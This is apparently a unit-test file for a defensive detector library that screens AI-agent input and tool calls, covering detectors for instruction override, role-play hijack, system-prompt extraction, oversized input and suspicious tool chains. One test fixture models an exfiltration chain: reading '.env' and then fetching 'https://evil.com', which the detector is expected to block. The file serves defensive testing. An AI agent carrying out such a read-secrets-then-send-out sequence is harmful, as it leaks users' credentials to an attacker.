"""Unit tests for the detector registry."""

from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from armor.detectors import DetectorRegistry
from armor.pipeline import Pipeline
from armor.types import Payload, SessionContext, Verdict


class MockDetector:
    """A mock detector for testing."""

    def __init__(self, detector_id: str = "mock.detector") -> None:
        """Initialize the mock detector."""
        self.id = detector_id
        self.category = "test"
        self.cost_tier = "static"

    def check(self, payload: Payload, ctx: SessionContext) -> Verdict:
        """Return a pass verdict."""
        return Verdict.pass_verdict()


class TestDetectorRegistry:
    """Test the DetectorRegistry."""

    def test_registry_initialization_empty(self) -> None:
        """Test that registry can be initialized empty."""
        with patch("importlib.metadata.entry_points", return_value=[]):
            registry = DetectorRegistry()
            assert len(registry) == 0
            assert registry.all() == []

    def test_registry_bool_empty(self) -> None:
        """Test that empty registry is falsy."""
        with patch("importlib.metadata.entry_points", return_value=[]):
            registry = DetectorRegistry()
            assert bool(registry) is False

    def test_registry_bool_nonempty(self) -> None:
        """Test that non-empty registry is truthy."""
        with patch("importlib.metadata.entry_points", return_value=[]):
            registry = DetectorRegistry()
            registry.detectors["test"] = MockDetector("test")
            assert bool(registry) is True

    def test_registry_manual_register(self) -> None:
        """Test manually registering a detector."""
        with patch("importlib.metadata.entry_points", return_value=[]):
            registry = DetectorRegistry()
            detector = MockDetector("test.detector")
            registry.detectors[detector.id] = detector

            assert len(registry) == 1
            assert registry.get("test.detector") == detector

    def test_registry_get_nonexistent(self) -> None:
        """Test getting a non-existent detector."""
        with patch("importlib.metadata.entry_points", return_value=[]):
            registry = DetectorRegistry()
            assert registry.get("nonexistent") is None

    def test_registry_all(self) -> None:
        """Test retrieving all detectors."""
        with patch("importlib.metadata.entry_points", return_value=[]):
            registry = DetectorRegistry()
            d1 = MockDetector("detector.1")
            d2 = MockDetector("detector.2")
            registry.detectors["detector.1"] = d1
            registry.detectors["detector.2"] = d2

            all_detectors = registry.all()
            assert len(all_detectors) == 2
            assert d1 in all_detectors
            assert d2 in all_detectors

    def test_registry_entry_point_loading(self) -> None:
        """Test loading detectors from entry points."""
        # Create mock entry points
        mock_ep = MagicMock()
        mock_ep.name = "mock_detector"
        mock_ep.load.return_value = MockDetector
        mock_ep.value = "tests.unit.detectors.test_registry:MockDetector"

        with patch("importlib.metadata.entry_points", return_value=[mock_ep]):
            registry = DetectorRegistry()
            assert len(registry) == 1
            assert registry.get("mock.detector") is not None

    def test_registry_entry_point_loading_failure(self) -> None:
        """Test that entry point loading failure doesn't crash the registry."""
        # Create mock entry point that fails to load
        mock_ep = MagicMock()
        mock_ep.name = "bad_detector"
        mock_ep.load.side_effect = ImportError("Module not found")
        mock_ep.value = "nonexistent.module:Detector"

        with patch("importlib.metadata.entry_points", return_value=[mock_ep]):
            # Should not raise; registry continues with other detectors
            registry = DetectorRegistry()
            assert len(registry) == 0

    def test_registry_entry_point_enum_failure(self) -> None:
        """Test that entry point enumeration failure doesn't crash the registry."""
        with patch(
            "importlib.metadata.entry_points",
            side_effect=RuntimeError("Metadata error"),
        ):
            # Should not raise; registry starts empty
            registry = DetectorRegistry()
            assert len(registry) == 0


class TestDetectorRegistryIntegration:
    """Integration tests for actual P0 detector registration."""

    def test_instruction_override_detector_registered(self) -> None:
        """Instruction override detector is registered."""
        registry = DetectorRegistry()
        assert "regex.instruction_override" in registry.detectors
        detector = registry.get("regex.instruction_override")
        assert detector is not None
        assert detector.id == "regex.instruction_override"
        assert detector.category == "direct_injection"
        assert detector.cost_tier == "static"

    def test_roleplay_hijack_detector_registered(self) -> None:
        """Role-play hijack detector is registered."""
        registry = DetectorRegistry()
        assert "regex.roleplay_hijack" in registry.detectors
        detector = registry.get("regex.roleplay_hijack")
        assert detector is not None
        assert detector.id == "regex.roleplay_hijack"
        assert detector.category == "direct_injection"
        assert detector.cost_tier == "static"

    def test_system_prompt_extraction_detector_registered(self) -> None:
        """System prompt extraction detector is registered."""
        registry = DetectorRegistry()
        assert "regex.system_prompt_extraction" in registry.detectors
        detector = registry.get("regex.system_prompt_extraction")
        assert detector is not None
        assert detector.id == "regex.system_prompt_extraction"
        assert detector.category == "direct_injection"
        assert detector.cost_tier == "static"

    def test_all_three_p0_detectors_present(self) -> None:
        """All three P0 regex detectors are present."""
        registry = DetectorRegistry()
        required_ids = {
            "regex.instruction_override",
            "regex.roleplay_hijack",
            "regex.system_prompt_extraction",
        }
        detector_ids = set(registry.detectors.keys())
        assert required_ids.issubset(detector_ids), f"Missing detectors: {required_ids - detector_ids}"

    def test_all_p0_detectors_have_check_method(self) -> None:
        """All P0 detectors have a check method."""
        registry = DetectorRegistry()
        required_ids = {
            "regex.instruction_override",
            "regex.roleplay_hijack",
            "regex.system_prompt_extraction",
        }
        for detector_id in required_ids:
            detector = registry.get(detector_id)
            assert detector is not None
            assert hasattr(detector, "check")
            assert callable(detector.check)

    def test_tool_chain_detector_registered(self) -> None:
        """tool_chain detector is registered.

        TC-086-01: Entry-point discovery — tool_chain in registry.
        """
        registry = DetectorRegistry()
        assert "meta.tool_chain" in registry.detectors
        detector = registry.get("meta.tool_chain")
        assert detector is not None
        assert detector.id == "meta.tool_chain"
        assert detector.cost_tier == "static"

    def test_token_count_anomaly_detector_registered(self) -> None:
        """token_count_anomaly detector is registered.

        TC-086-01: Entry-point discovery — token_count_anomaly in registry.
        """
        registry = DetectorRegistry()
        assert "meta.token_count_anomaly" in registry.detectors
        detector = registry.get("meta.token_count_anomaly")
        assert detector is not None
        assert detector.id == "meta.token_count_anomaly"
        assert detector.cost_tier == "static"


class TestDetectorIntegration:
    """Integration tests for detector firing and verdict generation."""

    @pytest.mark.asyncio
    async def test_token_count_anomaly_fires_on_absolute_cap(self) -> None:
        """TC-086-02: token_count_anomaly fires on input exceeding absolute cap.

        Runs check.input with a 33 KB payload (exceeds default 32 KB cap).
        Expects advisory verdict with token_count_anomaly signal.
        """
        registry = DetectorRegistry()
        detectors = registry.all()

        # Create a 33 KB payload (exceeds the 32768-byte default cap)
        large_input = "x" * (33 * 1024)
        payload = Payload(text=large_input)
        ctx = SessionContext(session_id="test-086-02", signal_history=[])

        verdict = await Pipeline.run(detectors, payload, ctx)

        # Should be advisory, not pass
        assert verdict.decision == "advisory", f"Expected advisory, got {verdict.decision}"
        # Should have token_count_anomaly signal
        assert verdict.signal_id is not None
        assert "token_count_anomaly" in verdict.signal_id, (
            f"Expected token_count_anomaly in signal, got {verdict.signal_id}"
        )

    @pytest.mark.asyncio
    async def test_tool_chain_fires_on_read_webfetch_sequence(self) -> None:
        """TC-086-03: tool_chain fires on Read .env → WebFetch sequence.

        Multi-turn fixture: turn 1 calls Read .env, turn 2 calls WebFetch to external host.
        When the chain is complete, the tool_chain detector fires with block verdict.
        """
        registry = DetectorRegistry()
        detectors = registry.all()

        # Initialize session
        session_id = "test-086-03"
        ctx = SessionContext(session_id=session_id, signal_history=[])

        # Turn 1: Read .env with file_path parameter (first step of chain, not blocked alone)
        payload1 = Payload(tool="Read", params={"file_path": ".env"})
        verdict1 = await Pipeline.run(detectors, payload1, ctx)
        # First step of chain doesn't trigger block by itself
        assert verdict1.decision == "pass", f"Expected pass for step 1, got {verdict1.decision}"

        # Turn 2: WebFetch to external host (completes the chain, tool_chain detector fires)
        payload2 = Payload(tool="WebFetch", params={"url": "https://evil.com"})
        verdict2 = await Pipeline.run(detectors, payload2, ctx)

        # Should match the read-env-then-fetch chain pattern and be blocked
        assert verdict2.decision == "block", f"Expected block for chain match, got {verdict2.decision}"
        assert verdict2.signal_id is not None
        assert "tool_chain" in verdict2.signal_id, f"Expected tool_chain in signal, got {verdict2.signal_id}"

    def test_spec_architecture_row_matches_source_paths(self) -> None:
        """TC-086-05: Spec architecture rows reference correct source file paths.

        Verifies that the architecture.md rows for tool_chain and token_count_anomaly
        have Source column links pointing to the actual module files.
        """
        repo_root = Path(__file__).resolve().parents[3]
        arch_file = repo_root / "docs/spec/architecture.md"
        arch_content = arch_file.read_text()

        # Check that both detectors are mentioned with correct file paths
        assert "detectors.tool_chain" in arch_content
        assert "src/armor/detectors/tool_chain.py" in arch_content

        assert "detectors.token_count_anomaly" in arch_content
        assert "src/armor/detectors/token_count_anomaly.py" in arch_content
